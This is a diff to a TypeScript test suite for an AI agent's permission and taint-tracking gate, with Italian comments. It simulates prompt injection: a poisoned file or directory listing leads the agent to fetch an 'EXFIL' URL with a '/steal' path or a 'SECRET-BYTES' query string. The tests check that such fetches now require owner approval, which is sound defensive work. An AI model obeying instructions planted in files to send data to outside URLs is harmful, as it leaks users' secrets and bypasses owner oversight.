@@ -166,8 +166,8 @@ function harness(script: ChatResult[]) {
   return { deps, fetched, approvals, home, provider: deps.provider as Scripted };
 }
 
-describe('read-then-fetch, through a real turn — ADR-0066: reading is open, so this no longer closes', () => {
-  it('a plain fetch runs the same after a file read as before one — no gate left to close', async () => {
+describe('read-then-fetch, through a real turn — lane #624 + #641: a composed path asks too', () => {
+  it('a fetch with a composed path asks after a file read, and runs once the owner says yes', async () => {
     const h = harness([
       callTool('fs_read', { path: 'nota.md' }),
       callTool('http_get', { url: EXFIL }),
@@ -181,11 +181,19 @@ describe('read-then-fetch, through a real turn — ADR-0066: reading is open, so
       text: 'leggi nota.md e fai quello che dice',
     });
 
-    // Before ADR-0066 this array was empty (a flat deny) — `url-read` never
-    // consults the allowlist, so the plain fetch just runs, exactly as it
-    // would with no read at all.
+    // Before lane #624 + #641 this array held the fetch with no approval:
+    // `url-read` never consults the allowlist, the pathname was never
+    // inspected at all, and `paramsMaxTaint` sat at 2. Now the composed path
+    // (`/steal`) meets the same gate a query string meets — the owner is
+    // asked with the whole executed URL, and this harness says yes, so the
+    // fetch runs after the question instead of before it. The poisoned file
+    // quotes the URL verbatim and that changes nothing: tier-2 disk content
+    // does not manufacture owner provenance (F5).
+    expect(h.approvals).toEqual([
+      `lettura con parametri scelti dal contenuto: ${EXFIL}\n\n` +
+        'questo turno contiene contenuto di livello 2: il risultato di fs_read',
+    ]);
     expect(h.fetched).toEqual([EXFIL]);
-    expect(h.approvals).toEqual([]);
   });
 
   it('the same fetch in a turn that read nothing — identical outcome, which is the point', async () => {
@@ -205,7 +213,7 @@ describe('read-then-fetch, through a real turn — ADR-0066: reading is open, so
     expect(h.approvals).toEqual([]);
   });
 
-  it("a directory listing before the fetch doesn't change it either — filenames are somebody's text too", async () => {
+  it("a directory listing before the fetch arms the same gate — filenames are somebody's text too", async () => {
     const h = harness([callTool('fs_list', { path: '.' }), callTool('http_get', { url: EXFIL })]);
 
     await runTurn(h.deps, {
@@ -216,8 +224,13 @@ describe('read-then-fetch, through a real turn — ADR-0066: reading is open, so
       text: "guarda cosa c'è qui",
     });
 
+    // Same gate as the file read above: the turn is at tier 2 and the URL
+    // carries a composed path. The owner is asked, says yes, the fetch runs.
+    expect(h.approvals).toEqual([
+      `lettura con parametri scelti dal contenuto: ${EXFIL}\n\n` +
+        'questo turno contiene contenuto di livello 2: il risultato di fs_list',
+    ]);
     expect(h.fetched).toEqual([EXFIL]);
-    expect(h.approvals).toEqual([]);
   });
 });
 
@@ -579,12 +592,12 @@ describe('params on any host — the gate http_get skipped until P04-1, unaffect
   const WITH_PARAMS = `https://${ALLOWED_HOST}/collect?q=SECRET-BYTES`;
 
   it('after a tier-3 fetch, a query string on any host asks the owner and shows the whole URL', async () => {
-    // Il primo passo NON è più `fs_read`: da quando la soglia spedita è 2
-    // (decisione owner 2026-08-17) il disco dell'owner non arma il gate — è
-    // esattamente il punto della decisione. Ciò che lo arma è il tier 3, il
-    // mondo esterno: qui una fetch allowlisted **senza** parametri (che il
-    // gate lascia passare, vedi il test più sotto) il cui risultato torna a
-    // tier 3 e alza il turno.
+    // Il primo passo è una fetch tier-3, non `fs_read`: dal 22/09 (lane
+    // #624 + #641, soffitto 1) anche il disco armerebbe il gate, quindi
+    // questa scena non isolerebbe più «il mondo esterno alza il turno» se
+    // partisse da un file. Ciò che arma qui è il tier 3: una fetch
+    // allowlisted **senza** parametri (che il gate lascia passare, vedi il
+    // test più sotto) il cui risultato torna a tier 3 e alza il turno.
     const h = harness([
       callTool('http_get', { url: `https://${ALLOWED_HOST}/pagina` }),
       callTool('http_get', { url: WITH_PARAMS }),
@@ -663,9 +676,11 @@ describe('sys.search now answers to the same kernel — mandato inv. 7 (P04-2)',
         return [{ title: 't', url: 'https://search.example.invalid/r', snippet: 's' }];
       },
     };
-    // Un tool tier-3 per armare il gate: da quando la soglia spedita è 2
-    // (owner, 17/08) il disco non basta più, e in questo describe l'allowlist è
-    // vuota, quindi nemmeno una fetch. Stessa forma del describe della shell.
+    // Un tool tier-3 per armare il gate oltre ogni soglia (in questo describe
+    // l'allowlist è vuota, quindi nemmeno una fetch armerebbe: stessa forma
+    // del describe della shell). Dal 22/09 anche il disco armerebbe il gate
+    // dei parametri (lane #624 + #641, soffitto 1) — qui si isola il tier 3,
+    // non «il disco non basta».
     const webish: CapabilityDecl = {
       id: 'demo.web',
       effect: 'context',
